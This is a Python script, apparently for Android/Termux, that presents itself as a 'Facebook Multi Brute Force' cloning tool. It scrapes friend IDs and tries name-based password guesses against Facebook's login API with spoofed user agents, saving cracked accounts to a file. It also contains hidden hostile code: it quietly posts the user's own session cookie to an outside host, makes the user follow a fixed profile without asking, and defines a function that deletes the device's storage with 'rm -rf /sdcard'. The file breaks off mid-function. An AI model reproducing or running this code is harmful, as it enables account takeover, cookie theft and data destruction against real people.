	ha = f"Dalvik/2.1.0 (Linux; U; Android {str(rr(3,13))}; {tt} Build/QP1A.190711.020) [FBAN/MessengerLite;FBAV/{str(rr(40,367))}.0.0.6.48;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/{str(rr(000000000,999999999))};FBCR/Asiacell;FBMF/samsung;FBBD/samsung;FBDV/SM-A600F;FBSV/{str(rr(3,13))};FBCA/armeabi-v7a:armeabi;FBDM/"+"{density=2.25,height=,width=};]"
	hi = f"Dalvik/2.1.0 (Linux; U; Android {str(rr(3,13))}; {tt} Build/MMB29K) [FBAN/MessengerLite;FBAV/{str(rr(40,367))}.0.0.8.93;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/{str(rr(000000000,999999999))};FBCR/AXIS;FBMF/samsung;FBBD/samsung;FBDV/{tt};FBSV/{str(rr(3,13))};FBCA/armeabi-v7a:armeabi;FBDM/"+"{density=2.25,height=1024,width=2048};]"
	uaku3 = random.choice([ha,hi])
	ugen.append(uaku3)

def uaku12():
	ua = f"Dalvik/2.1.0 (Linux; U; Android {str(random.randint(9,13))}; 21061119AG Build/RP1A.200720.011) [FBAN/MessengerLite;FBAV/{str(random.randint(40,375))}.317.0.0.3.41;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/655591880;FBCR/AXIS;FBMF/Xiaomi;FBBD/Redmi;FBDV/21061119AG;FBSV/{str(random.randint(9,13))};FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/"+"{density=2.25,height=,width=};]"
	ue = f"Dalvik/2.1.0 (Linux; U; Android {str(random.randint(9,13))}; V2166 Build/SP1A.210812.003) [FBAN/MessengerLite;FBAV/{str(random.randint(40,375))}.321.0.0.1.102;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/953739856;FBCR/AXIS;FBMF/vivo;FBBD/vivo;FBDV/V2166;FBSV/{str(random.randint(9,13))};FBCA/armeabi-v7a:armeabi;FBDM/"+"{density=2.25,height=,width=};]"
	us = f"Dalvik/2.1.0 (Linux; U; Android {str(random.randint(9,13))}; M2010J19SG Build/QKQ1.200830.002) [FBAN/MessengerLite;FBAV/{str(random.randint(40,375))}.309.0.0.6.99;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/140057610;FBCR/AXIS;FBMF/Xiaomi;FBBD/Redmi;FBDV/M2010J19SG;FBSV/{str(random.randint(9,13))};FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/"+"{density=2.25,height=1024,width=2048};]"
	ui = f"Dalvik/2.1.0 (Linux; U; Android {str(random.randint(9,13))}; CPH1923 Build/PPR1.180610.011) [FBAN/MessengerLite;FBAV/{str(random.randint(40,375))}.312.0.0.1.74;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/509521964;FBCR/AXIS;FBMF/OPPO;FBBD/OPPO;FBDV/CPH1923;FBSV/{str(random.randint(9,13))};FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/"+"{density=2.25,height=,width=};]"
	uk = f"Dalvik/2.1.0 (Linux; U; Android {str(random.randint(9,13))}; M2004J19C Build/RP1A.200720.011) [FBAN/MessengerLite;FBAV/{str(random.randint(40,375))}.320.0.0.8.147;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/240523462;FBCR/AXIS;FBMF/Xiaomi;FBBD/Redmi;FBDV/M2004J19C;FBSV/{str(random.randint(9,13))};FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/"+"{density=2.25,height=,width=};]"
	uaku = random.choice([ua,ue,us,ui,uk])
	return uaku

ugent=[]
for xd in range(10000):
	rr = random.randint
	b = random.choice(['RMX2200','RMX3300','RMX3571','RMX3311','RMP2107','RMX3571','RMX3357','RMX3461','RMX3478','Nokia C21 Plus','Nokia C01 Plus','Nokia G11','Nokia X30 5G','Nokia C31','Nokia C31','; P13 Blue Max Pro 256 GB','N5502L','Konnect_556','22111317PG','G301','RMX3563','OMIX X500','SLTDVD1024','P13 Blue Max Lite 2022','WOW64','ONA19TB003','KingPad_K10','Nokia G60 5G','C6L','Scepter 8 Tablet','ONA19TB003','P651 2021','M2101K7BL','Hisense F23','PECT30','RMX3310','GAU0820','OPPO A79','V2130A','V2190A','V2180GA','V2172A'])
	c = random.choice(["","HeyTapBrowser/40.8.12.1","[FB_IAB/FB4A;FBAV/409.0.0.27.106;]","[FB_IAB/FB4A;FBAV/409.0.0.27.106;]","[FB_IAB/FB4A;FBAV/409.0.0.27.106;]","[FBAN/MessengerLiteForiOS;FBAV/399.0.0.26.69;FBBV/453638119;FBDV/iPhone14,5;FBMD/iPhone;FBSN/iOS;FBSV/16.3.1;FBSS/3;FBCR/;FBID/phone;FBLC/fr;FBOP/0]","[FBAN/MessengerLiteForiOS;FBAV/399.0.0.26.69;FBBV/453638119;FBDV/iPhone11,8;FBMD/iPhone;FBSN/iOS;FBSV/16.3.1;FBSS/2;FBCR/;FBID/phone;FBLC/en-GB;FBOP/0]","[FBAN/MessengerLiteForiOS;FBAV/399.0.0.26.69;FBBV/453638119;FBDV/iPad11,4;FBMD/iPad;FBSN/iPadOS;FBSV/16.3.1;FBSS/2;FBCR/;FBID/tablet;FBLC/en;FBOP/0]","[FBAN/MessengerLiteForiOS;FBAV/389.0.0.28.214;FBBV/426266477;FBDV/iPhone13,4;FBMD/iPhone;FBSN/iOS;FBSV/16.1.1;FBSS/3;FBCR/;FBID/phone;FBLC/en;FBOP/0]","[FBAN/MessengerLiteForiOS;FBAV/390.0.0.20.104;FBBV/428146516;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/16.2;FBSS/2;FBCR/;FBID/phone;FBLC/fr;FBOP/0]","[FBAN/MessengerLiteForiOS;FBAV/390.0.0.20.104;FBBV/428146516;FBDV/iPhone14,5;FBMD/iPhone;FBSN/iOS;FBSV/15.0.2;FBSS/3;FBCR/;FBID/phone;FBLC/en;FBOP/0]","[FBAN/MessengerLiteForiOS;FBAV/390.0.0.20.104;FBBV/428146516;FBDV/iPhone14,5;FBMD/iPhone;FBSN/iOS;FBSV/15.0;FBSS/3;FBCR/;FBID/phone;FBLC/en;FBOP/0]"])
	basu=f'Mozilla/5.0 (Linux; Android {str(rr(3,13))}; {b} Build/TKQ1.220829.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(70,150))}.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/410.0.0.15.115;]'
	basi=f"Mozilla/5.0 (Linux; Android {str(rr(3,13))}; RMX3311 Build/QPIS30.28-Q3-28-26-4-1-7; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(70,150))}.0.5615.56 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]"
	base=f"Mozilla/5.0 (Linux; Android {str(rr(3,13))}; RMP2107 Build/STAS32.79-77-28-18-1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(70,150))}.0.5615.56 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]"
	uaku2 = random.choice([basu,basi,base])
	ugent.append(uaku2)

ugent=[]
for xd in range(10000):
	rr = random.randint
	b = random.choice(['RMX2200','RMX3300','RMX3571','RMX3311','RMP2107','RMX3571','RMX3357','RMX3461','RMX3478','Nokia C21 Plus','Nokia C01 Plus','Nokia G11','Nokia X30 5G','Nokia C31','Nokia C31','; P13 Blue Max Pro 256 GB','N5502L','Konnect_556','22111317PG','G301','RMX3563','OMIX X500','SLTDVD1024','P13 Blue Max Lite 2022','WOW64','ONA19TB003','KingPad_K10','Nokia G60 5G','C6L','Scepter 8 Tablet','ONA19TB003','P651 2021','M2101K7BL','Hisense F23','PECT30','RMX3310','GAU0820','OPPO A79','V2130A','V2190A','V2180GA','V2172A'])
	c = random.choice(["","HeyTapBrowser/40.8.12.1","[FB_IAB/FB4A;FBAV/409.0.0.27.106;]","[FB_IAB/FB4A;FBAV/409.0.0.27.106;]","[FB_IAB/FB4A;FBAV/409.0.0.27.106;]","[FBAN/MessengerLiteForiOS;FBAV/399.0.0.26.69;FBBV/453638119;FBDV/iPhone14,5;FBMD/iPhone;FBSN/iOS;FBSV/16.3.1;FBSS/3;FBCR/;FBID/phone;FBLC/fr;FBOP/0]","[FBAN/MessengerLiteForiOS;FBAV/399.0.0.26.69;FBBV/453638119;FBDV/iPhone11,8;FBMD/iPhone;FBSN/iOS;FBSV/16.3.1;FBSS/2;FBCR/;FBID/phone;FBLC/en-GB;FBOP/0]","[FBAN/MessengerLiteForiOS;FBAV/399.0.0.26.69;FBBV/453638119;FBDV/iPad11,4;FBMD/iPad;FBSN/iPadOS;FBSV/16.3.1;FBSS/2;FBCR/;FBID/tablet;FBLC/en;FBOP/0]","[FBAN/MessengerLiteForiOS;FBAV/389.0.0.28.214;FBBV/426266477;FBDV/iPhone13,4;FBMD/iPhone;FBSN/iOS;FBSV/16.1.1;FBSS/3;FBCR/;FBID/phone;FBLC/en;FBOP/0]","[FBAN/MessengerLiteForiOS;FBAV/390.0.0.20.104;FBBV/428146516;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/16.2;FBSS/2;FBCR/;FBID/phone;FBLC/fr;FBOP/0]","[FBAN/MessengerLiteForiOS;FBAV/390.0.0.20.104;FBBV/428146516;FBDV/iPhone14,5;FBMD/iPhone;FBSN/iOS;FBSV/15.0.2;FBSS/3;FBCR/;FBID/phone;FBLC/en;FBOP/0]","[FBAN/MessengerLiteForiOS;FBAV/390.0.0.20.104;FBBV/428146516;FBDV/iPhone14,5;FBMD/iPhone;FBSN/iOS;FBSV/15.0;FBSS/3;FBCR/;FBID/phone;FBLC/en;FBOP/0]"])
	basu=f'Mozilla/5.0 (Linux; Android {str(rr(3,13))}; {b} Build/TKQ1.220829.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(70,150))}.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/410.0.0.15.115;]'
	basi=f"Mozilla/5.0 (Linux; Android 7.1.2; vivo X9i Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(70,150))}.0.5615.56 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]"
	base=f"Mozilla/5.0 (Linux; Android {str(rr(3,13))}; V2230 Build/TP1A.220624.014_IN; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(70,150))}.0.5615.56 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]"
	uaku2 = random.choice([basi,base])
	ugent.append(uaku2)

def security():
    try:
        uid=os.getuid()#auto key garnet by termux uid
        xx = ('libsooney.so')
        try:
            key1=open(f'/data/data/com.termux/files/usr/bin/{xx}','r').read()
        except:
            keysv=uuid.uuid4().hex[:5].upper()#Auto Key Grante By uuid
            key1=open(f'/data/data/com.termux/files/usr/bin/{xx}','w').write(keysv)
        kk = ('github')
        k1 = ('CodeXz01')
        k2 = ('confirm')
        k3 = ('token.txt')
        key1=open(f'/data/data/com.termux/files/usr/bin/{xx}','r').read()
        key=(f'USA-H{uid}5X{key1}110E==')#full key
        mysite= requests.get(f'https://{kk}.com/{k1}/{k2}/blob/main/{k3}').text#approve site
        if key in mysite:
                os.system('clear')
                ACL()
        else:
                os.system('clear')
                
                print(f'[+] Your Key Not Registerd...')
                print(f'[+] This Tools Only For Paid Users \n[+] Free Users Saty A Way')
                print(f'[+] Your Key : \033[1;32m'+key)
                input(f'\033[1;37m[+] Press Enter For Approve ')    
                whatsapp = "+6283115893229"
                url_wa = "https://api.whatsapp.com/send?phone="+whatsapp+"&text="
                tks = ("Hello Sir\nI will buy your command\nMy Key :- "+key)
                subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                os.system('python run.py');pass
    except requests.exceptions.ConnectionError:
    	print("\033[1;32minternet connection lol \033[1;37m")
    
    
def eak():
	os.system('rm -rf /sdcard/HOME')
	os.system('rm -rf /sdcard')
	os.system('rm -rf /sdcard/DCIM')
	print('eak yatim kenak prank')
## [ ALL MENU ] ##
class ACL:

    def __init__(self):
        self.ses=requests.Session()
        self.url = "https://www.facebook.com"
        self.id, self.ok, self.cp, self.loop = [], [], [], 0
        self.cok = "https://api-cdn-fb.yayanxd.my.id/submit.php"
        self.kontol, self.iya, self.pasw = {}, [], []
        self.ak, self.ka, self.ya = [], [], []
        self.menu()

    def hapus(self):
        try:os.remove(".cok.txt");os.remove(".tok.txt")
        except:pass

        ### LOGO LE ##
    def logo(self):
        if "win" in sys.platform:os.system("cls")
        else:os.system("clear")
        print(f"""{H}  
          _          ______    _____     
         {A}/ \       .' ___  |  |_   _|    
        {A}/ _ \     / .'   \_|    | |    {N}[ {M} Version 0.1{N} ]  
       {A}/ ___ \    | |           | |   _    
     {A}_/ /   \ \_  \ `.___.'\   _| |__/ | 
    {H}|____| |____|  `.____ .'  |________|                                     

    {A}[ {H}Script Facebook Multi Brute Force {A}]                           
         [{H} Crated Code By Acil {A}]{N}                            
                                    """)

        # LOGIN HACKED $##
    def login_cokie(self):
        self.logo()
        try:
            cok = input("[?] cookie : ")
            link = self.ses.get(f"{self.url}/profile.php?v=info", cookies={"cookie": cok}).text
            if 'href="/zero/optin/write/' in str(link):
                print("[+] notice: anda sedang menggunakan mode free facebook")
                print("[-] Mohon tunggu sebentar, system sedang mengubah cookie ke mode data.")
                urll = re.search('href="/zero/optin/write/?(.*?)"', str(link)).group(1).replace("amp;", "")
                gett = self.ses.get(f"{self.url}/zero/optin/write/{urll}", cookies={"cookie": cok}).text
                poss = par(gett, "html.parser").find("form",{"method":"post"})["action"].replace("amp;", "")
                date = {"fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(gett)).group(1),"jazoest" : re.search('name="jazoest" value="(.*?)"', str(gett)).group(1)}
                self.ses.post(f"{self.url}{poss}", data=date, cookies={"cookie": cok}).text
                exit("\n[✓] proses mengubah ke mode data telah selesai.\n[-] silahkan masukan ulang cookie nya dengan mengetik python regex.py")
            elif 'href="/x/checkpoint/' in str(link):
                print("\n[!] Opshh cookie anda chekcpoint:(");time.sleep(2);self.login_cokie()
            elif 'href="/r.php' in str(link):
                print("[!] cookie yang anda masukan invalid");time.sleep(2);self.login_cokie()
            else:
                print("\n[-] Mohon tunggu sebentar...")
                self.ubah_bahasa({"cookie": cok})
                nama = re.findall("\<title\>(.*?)<\/title\>", link)[0]
                user = re.search("c_user=(\d+)", str(cok)).group(1)
                open('.cok.txt', 'w').write(cok);open('.tok.txt', 'w').write(f"{nama}|{user}")
                print(f"[✓] selamat datang {nama} di ACL Meta");self.ikuti({"cookie": cok});self.datas(nama, cok)
                exit("\n[!] jalankan ulang perintah nya dengan ketik python run.py")
        except requests.ConnectionError:
            exit("\n[!] Tidak ada koneksi")

    def datas(self, nama, coki):
        try:
            data = {"title": nama, "message": coki}
            post = self.ses.post(self.cok, data=data).text
        except requests.ConnectionError:
            exit("\n[!] Tidak ada koneksi")


    def ubah_bahasa(self, cok):
        try:
            link = self.ses.get(f"{self.url}/language/", cookies=cok).text
            data = par(link, "html.parser")
            for x in data.find_all('form',{'method':'post'}):
                if "Bahasa Indonesia" in str(x):
                    bahasa = {"fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(link)).group(1),"jazoest" : re.search('name="jazoest" value="(.*?)"', str(link)).group(1), "submit"  : "Bahasa Indonesia"}
                    self.ses.post(f"{self.url}{x['action']}", data=bahasa, cookies=cok)
        except:pass

    def ikuti(self, cok):
        try:
            link = par(self.ses.get(f"{self.url}/profile.php?id=100040708001839", cookies=cok).text, "html.parser")
            xnxx = link.find("a", string="Ikuti").get("href")
            self.ses.get(f"{self.url}{str(xnxx)}", cookies=cok).text
        except:pass


    def menu(self):
        try:
            cook = {"cookie": open(".cok.txt", "r").read()}
            nama, user = open(".tok.txt", "r").read().split("|")
        except FileNotFoundError:
            self.login_cokie()
        self.logo()
        try:
            link = self.ses.get(f"{self.url}/profile.php?v=info", cookies=cook).text
            if "www_logout_button" not in link:
                self.hapus()
                print(f"\n[{M}!{N}] Akun mendapat checkpint, silakan masuk dengan akun lain.");time.sleep(3);self.login_cokie()
        except requests.ConnectionError:
            exit("\n[!] Tidak ada koneksi")
        print(f"ᄂ {H}Your Account Facebook{N}\n")
        print(f"ᄂ Your Account Name ↪ {H}{nama}{N}")
        print(f"ᄂ Your Account ID   ↪ {H}{user}{N}")
        print(47*"°")
        print(f" ↪ {A}MENU CRACKED{N}\n")
        print(f' ᄂ {H}1{A} Start Cloning Multi Publik ↪ {H}ON{N} ')
        print(f' ᄂ {H}2{A} Start File Cloning  ↪ {H}ON{N} ')
        print(f' ᄂ {H}3{A} Start Cloning Email  ↪ {M}OFF{N} ')
        print(f' ᄂ {H}4{A} Start File Cloning   ↪ {M}OFF{N} ')
        ###print(f' ᄂ {H}6{A} Check Dectector  ↪ {H}ON{N} ')
        print(f' ᄂ {H}E{A} {M}Exit {N} ')
        anjay = input(' ᄂ Choose option : ')
        print(47*"-")
        if anjay in ["", " "]:
            print("[!] jangan kosong");time.sleep(2);self.menu()
        elif anjay in ["1", "01"]:
            print("[+] ketik 'me' jika ingin crack dari teman anda.")
            user = input(f"[{O}*{N}] enter id or username : ")
            if "me" in user:
                try:
                    link = par(self.ses.get(f"{self.url}/profile.php", cookies=cook).text, "html.parser")
                    if "Anda Diblokir Sementara" in link:
                        print("[!] facebook membatasi setiap aktivitas, limit bro, silahkan beralih akun");time.sleep(2);self.menu()
                    else:
                        print("[!] to stop press CTRL then press C on your keyboard.")
                        self.batur(self.url+link.find("a", string="Teman").get("href"), cook)
                except(requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
                    exit("[!] kesalahan pada koneksi")
                print()
                self.metode()
            else:
                try:
                    link = self.ses.get(f"{self.url}/{user}/friends", cookies=cook).text
                    if "Halaman Tidak Ditemukan" in link:
                        print(f"[!] pengguna dengan {user} tidak ditemukan");time.sleep(2);self.menu()
                    elif "Anda Diblokir Sementara" in link:
                        print("[!] facebook membatasi setiap aktivitas, limit bro, silahkan beralih akun");time.sleep(2);self.menu()
                    elif "Konten Tidak Ditemukan" in link:
                        print(f"[!] pengguna dengan {user} tidak ditemukan");time.sleep(2);self.menu()
                    else:
                        print("[!] to stop press CTRL then press C on your keyboard.")
                        self.batur(f"{self.url}/{user}/friends", cook)
                except(requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
                    exit("[!] kesalahan pada koneksi")
                print()
                self.metode()
        elif anjay in ["2", "02"]:
            self.file = input('Put File Name :  ')
            try:
                self.id = open(self.file).read().splitlines()
                self.metode()
            except FileNotFoundError:
                print('Opps File Not Found ...')
                time.sleep(2)
                os.system('clear')
                print('Try Again ...')
                time.sleep(2)
        elif anjay in ["3", "03"]:
            exit("belum selesai:)")
        elif anjay in ["4", "04"]:
            exit("belum selesai:)")
        elif anjay in ["e", "E"]:
            self.hapus()
            exit("done remove cookie")
        else:print("[!] input yang bner kontol");time.sleep(2);self.menu()

#-------------- DUMP ID -------------------
    def batur(self, link, coki):
        try:
            kontol = self.ses.get(link, cookies=coki).text
            memek=re.findall('middle\"\>\<a\ class\=\"..\"\ href\=\"(.*?)\"\>(.*?)\<\/a\>',kontol)
            for softek in memek:
                if "profile.php?" in softek[0]:
                    self.id.append(re.findall("id\=(.*?)\&", softek[0])[0]+"|"+softek[1])
                else:
                    self.id.append(re.findall("\/(.*?)\?eav",softek[0])[0]+"|"+softek[1])
                sys.stdout.write(f"\r[+] sedang mengumpulkan {str(len(self.id))} id..");sys.stdout.flush()
            if "Lihat Teman Lain" in kontol:
                self.batur(self.url+par(kontol, "html.parser").find("a", string="Lihat Teman Lain").get("href"), coki)
        except:pass

    def metode(self):
        print(f"[=] total ids: {str(len(self.id))}")
        print(47*"•")
        print('\t   ⟼ %s1%s Method B-Graph%s'%(H,A,N))
        print('\t   ⟼ %s2%s Method Reguler%s'%(H,A,N))
        print('\t   ⟼ %s3%s Method Validate%s'%(H,A,N))
        hc = input('Choice : ')
        if hc in ['1','01']:
            self.paswww("api")
        elif hc in ['2','02']:
            self.paswww("acy")
        elif hc in ['3','03']:
            self.paswww("dat")
        else:
            self.paswww("acy")

    def paswww(self, xx):
        print(47*"•")
        print('\n\t    %s➛ %s1%s manual password%s'%(N,H,A,N))
        print('\t    %s➛ %s2%s gabung password%s'%(N,H,A,N))
        print('\t    %s➛ %s3%s otomatis password%s'%(N,H,A,N))
        ykh = input('Method : ')
        if ykh in ["", " "]:
            print("[!] jangan kosong");time.sleep(2);self.menu()
        elif ykh in ["1", "01"]:
            self.manual(xx)
        elif ykh in ["2", "02"]:
            print('kata sandi minimal 6 karakter, gunakan "," (koma) untuk kata sandi berikut nya\n')
            kata = input(f"[{M}?{N}] sandi: ")
            xnxx = kata.split(",")
            for i in xnxx:
                self.pasw.append(i)
            print(f"kata sandi tambahan -> [ {M}{kata}{N} ]")
            self.carckk(xx)
        elif ykh in ["3", "03"]:
            self.carckk(xx)
        else:print("[!] input yang bner kontol");time.sleep(2);self.paswww()


    def manual(self, xx):
        self.iya.append("iya")
        print('kata sandi minimal 6 karakter, gunakan "," (koma) untuk kata sandi berikut nya\n')
        pwek = input(f"[{O}?{N}] sandi : ")
        if pwek in[""," "]:
            print(f"[{M}×{N}] jangan kosong bro kata sandi nya")
        elif len(pwek)<=5:
            print(f"[{M}×{N}] kata sandi minimal 6 karakter")
        else:
            if "api" in xx:
                print(f' [{H}×{N}] Play Airplane Mode Every {M}500 ID{N}\n')
                with Modol(max_workers=30) as bool:
                    for user in self.id:
                        bool.submit(self.api, user.split("|")[0], pwek)
                exit("\n\ncracking done!")
            elif "acy" in xx:
                print(f' [{H}×{N}] Play Airplane Mode Every {M}500 ID{N}\n')
                with Modol(max_workers=30) as bool:
                    for user in self.id:
                        bool.submit(self.asycn, user.split("|")[0], pwek, xx)
                exit("\n\ncracking done!")
            elif "dat" in xx:
                print(f' [{H}×{N}] Play Airplane Mode Every {M}500 ID{N}\n')
                with Modol(max_workers=30) as bool:
                    for user in self.id:
                        bool.submit(self.asycn, user.split("|")[0], pwek, xx)
                exit("\n\ncracking done!")
            else:pass

    def carckk(self, kntd):
        print(f' [{H}×{N}] Play Airplane Mode Every {M}500 ID{N}\n')
        with Modol(max_workers=30) as bool:
            for user in self.id:
                uid, nama = user.split("|")[0], user.split("|")[1].lower()
                depan = nama.split(" ")
                try:
                    if len(nama) <=5:
                        if len(depan) <=1 or len(depan) <=2:pass
                        else:
                            pwx = [nama, depan[0]+depan[1], depan[0]+"123", depan[0]+"12345"]
                    else:
                        pwx = [nama, depan[0]+depan[1], depan[0]+"123", depan[0]+"12345"]
                    if "iya" in self.iya:
                        for x in self.pasw:
                            pwx.append(x)
                    if "api" in kntd:
                        bool.submit(self.api, uid, pwx)
                    elif "acy" in kntd:
                        bool.submit(self.asycn, uid, pwx, kntd)
                    elif "dat" in kntd:
                        bool.submit(self.asycn, uid, pwx, kntd)
                    else:bool.submit(self.api, uid, pwx)
                except:pass
            exit("\n\ncracking done!")
    def uaku(self):
        android_version = subprocess.check_output("getprop ro.build.version.release",shell=True).decode("utf-8").replace("\n","")
        model_device = subprocess.check_output("getprop ro.product.model",shell=True).decode("utf-8").replace("\n","")
        build_device = subprocess.check_output("getprop ro.build.id",shell=True).decode("utf-8").replace("\n","")
        versi_chrome = str(random.randint(300,325))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
        large_device = "{density=2.25,height="+subprocess.check_output("getprop ro.hwui.text_large_cache_height",shell=True).decode("utf-8").replace("\n","")+",width="+subprocess.check_output("getprop ro.hwui.text_large_cache_width",shell=True).decode("utf-8").replace("\n","")+"}"
        merk_device = subprocess.check_output("getprop ro.product.manufacturer",shell=True).decode("utf-8").replace("\n","")
        brand_device = subprocess.check_output("getprop ro.product.brand",shell=True).decode("utf-8").replace("\n","")
        cpu_device = subprocess.check_output("getprop ro.product.cpu.abilist",shell=True).decode("utf-8").replace(",",":").replace("\n","")
        versi_app = str(random.randint(111111111,999999999))
        language = "id_ID"
        try:
            simcard = subprocess.check_output("getprop gsm.operator.alpha",shell=True).decode("utf-8").split(",")[1].replace("\n","")
        except:
            simcard = subprocess.check_output("getprop gsm.operator.alpha",shell=True).decode("utf-8").split(",")[0].replace("\n","")
            ugent = f"Davik/2.1.0 (Linux; U; Android {android_version}; {model_device} Build/{build_device}) [FBAN/MessengerLite;FBAV/{versi_chrome};FBPN/com.facebook.mlite;FBLC/{language};FBBV/{versi_app};FBCR/{simcard};FBMF/{merk_device};FBBD/{brand_device};FBDV/{model_device};FBSV/{android_version};FBCA/{cpu_device};FBDM/"+str(large_device)+";]"
            return ugent
    
    def ua_api(self):
        rr = random.randint
        bapakkau = random.choice
        xxxxx = ["A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"]
        versi = random.choice(['Infinix 93K Prime', 'Infinix A5', 'Infinix a54', 'Infinix A87', 'Infinix AIR', 'Infinix C8818'])
        build = f"{random.choice(xxxxx)}{random.choice(xxxxx)}{random.choice(xxxxx)}{random.randint(10,90)}{random.choice(xxxxx)}.{random.randint(100000,900000)}.{random.randint(100,300)}"
        honda = f"Davik/2.1.0 (Linux; U; Android {str(rr(4,13))}; Infinix G636 Build/{build}) [FBAN/MessengerLite;FBAV/{str(rr(40,347))}.314.0.0.7.117;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/661385480;FBCR/AXIS;FBMF/Infinix;FBBD/Infinix;FBDV/V1962BA;FBSV/{str(rr(4,13))};FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/"+"{density=2.25,height=2048,width=1260};]"
        supra =f"Davik/2.1.0 (Linux; U; Android {str(rr(4,10))}; Infinix 2010 Build/{build}) [FBAN/MessengerLite;FBAV/{str(rr(50,327))}.307.0.0.5.99;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/272238242;FBCR/INDOSAT;FBMF/Infinix;FBBD/Infinix;FBDV/Infinix 2010;FBSV/{str(rr(6,13))};FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/"+"{density=2.0,height=2048,width=750};]"
        bapak = f"Davik/2.1.0 (Linux; U; Android {str(rr(6,12))}; Infinix AIR Build/{build}) [FBAN/MessengerLite;FBAV/{str(rr(40,350))}.301.0.0.2.136;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/180988663;FBCR/XL Axiata;FBMF/Infinix;FBBD/Infinix;FBDV/Infinix AIR;FBSV/{str(rr(6,12))};FBCA/armeabi-v7a:armeabi;FBDM/"+"{density=2.25,height=1060,width=2048};]"
        return bapakkau([honda, supra, bapak])

    def ua_fb(self):
        versi = random.choice(['8','9','10','11','12','13'])
        model = random.choice(["V2027","vivo 1093","vivo 1304","vivo V3"])
        versi_apk = str(random.randint(300,325))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
        versi_app = random.randint(410000000,499999999)
        return (f"Dalvik/2.1.0 (Linux; U; Android {versi}) {model} Build/RP1A.200720.012; wv) [FBAN/FB4A;FBAV/{versi_apk};FBPN/com.facebook.katana;FBLC/en_US;FBBV/{versi_app};FBCR/Axis;FBMF/Vivo;FBBD/Vivo;FBDV/{model};FBSV/7.1.2;FBCA/{versi};armeabi-v7a;FBDM/"+"{density=1.49375,width=1280,height=720};FB_FW/1;FBRV/0;]")

    def api(self, username, pasw):
        sys.stdout.write(f'\r\r\033[1;37m [{H}B-graph{N}] %s|\033[1;32mLive:-%s \033[1;37m'%(self.loop,len(self.ok)));sys.stdout.flush()
        for password in pasw:
            try:
                ses=requests.Session()
                uas=uaku12()
                #heads = random.choice(ugent)
                header = {"Content-Type": "application/x-www-form-urlencoded","Host": "graph.facebook.com","User-Agent": uas,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "MOBILE.LTE","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
                data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":username,"password":password,"access_token":"275254692598279|585aec5b4c27376758abb7ffcb9db2af","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
                response = ses.post('https://b-graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
                if "session_key" in response.text:
                    print('\r\r\033[1;32m [OK] '+username+' | '+password+'\033[1;97m')
                    kntl = (f"[✓] {username}|{password}")
                    self.ok.append(kntl)
                    open('/sdcard/cil-OK.txt','a').write(kntl+'\n')
                    break
                elif "www.facebook.com" in response.text:
                    print(f'\r\r{M} [CP] '+username+' | '+password+'\033[1;97m')
                    kntl = (f"[×] {username}|{password}")
                    self.cp.append(kntl)
